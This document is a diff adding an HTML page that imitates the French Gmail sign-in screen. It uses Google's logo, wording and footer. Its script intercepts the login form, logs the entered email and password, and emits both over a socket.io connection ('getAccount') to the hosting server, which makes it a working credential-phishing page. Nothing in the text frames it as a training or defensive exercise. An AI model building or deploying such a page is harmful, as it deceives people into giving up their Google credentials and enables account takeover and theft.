@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Gmail</title>
+    <link rel="stylesheet" href="gmail_login.css"/>
+    <link rel="stylesheet" href="google.css"/>
+    <link href="http://fonts.googleapis.com/css?family=Open+Sans:300italic,300,400italic,400,600italic,600,700italic,700,800italic,800" rel="stylesheet" type="text/css">
+  </head>
+  <body>
+    <img alt="Google" class="logo" src="https://ssl.gstatic.com/accounts/ui/logo_2x.png"/>
+    <!-- <h2>One account. All of Google.</h2> -->
+    
+    <h3>Connectez-vous à Gmail</h3>
+    <form id='submitForm' action="">
+      <img id="profile-img" class="profile-img" src="user.png" alt="">
+      <input name="login" id="loginInput" type="email" placeholder="Adresse mail ou numéro de téléphone"/>
+      <input name="login" id="passwordInput" type="password" placeholder="Saisissez votre mot de passe"/>
+      <button>Connexion</button>
+      <a>Besoin d'aide ?</a>
+    </form>
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        var socket = io();
+
+        form = document.getElementById('submitForm');
+        email = document.getElementById('loginInput');
+        password = document.getElementById('passwordInput');
+        
+        form.addEventListener('submit', function (e) {
+            e.preventDefault();
+            console.log(email.value)
+            console.log(password.value)
+            socket.emit('getAccount', email.value, password.value);
+        });
+    </script>
+    <footer>
+        <p class="oneaccount">Un seul compte Google pour tout Google</p>
+        <img src="https://ssl.gstatic.com/accounts/ui/logo_strip_2x.png" alt="">
+        <ul class="links">
+          <li> Google </li>
+          <li> <a href="">Privacy & Terms</a> </li>
+          <li> <a href="">Aide</a> </li>
+        </ul>
+      
+        <div class="select-language">
+            <img src="https://ssl.gstatic.com/images/icons/ui/common/universal_language_settings-21.png" alt="Change language">
+          <select>
+            <option selected>Français (France)</option>
+          </select>
+        </div>
+      </footer>
+  </body>
+</html>
